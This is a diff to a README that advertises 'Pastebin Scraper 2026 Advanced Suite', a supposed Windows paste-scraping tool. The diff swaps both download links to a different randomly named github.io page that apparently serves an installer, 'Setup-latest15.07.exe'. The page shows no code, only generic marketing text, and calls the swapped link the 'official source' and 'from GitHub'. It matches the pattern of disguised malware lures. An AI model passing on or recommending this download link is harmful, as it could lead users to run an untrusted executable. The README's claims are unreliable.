@@ -2,7 +2,7 @@
 
 Pastebin Scraper 2026 Advanced Suite is a comprehensive Windows desktop application engineered for efficient bulk downloading, keyword filtering, and automated extraction of paste data from online platforms. This tool harnesses advanced algorithms and a user-friendly interface to streamline paste management, analysis, and monitoring in 2026, making it ideal for researchers, security analysts, and data enthusiasts who need to handle large volumes of paste content quickly and reliably.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ A: While optimized for Pastebin, the tool can be configured to scrape data from 
 
 To get started with Pastebin Scraper 2026 Advanced Suite, download the latest version from the official source:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the installer file "Setup-latest15.07.exe" and any accompanying documentation. Ensure you always download from trusted sources to maintain security and receive updates.
 
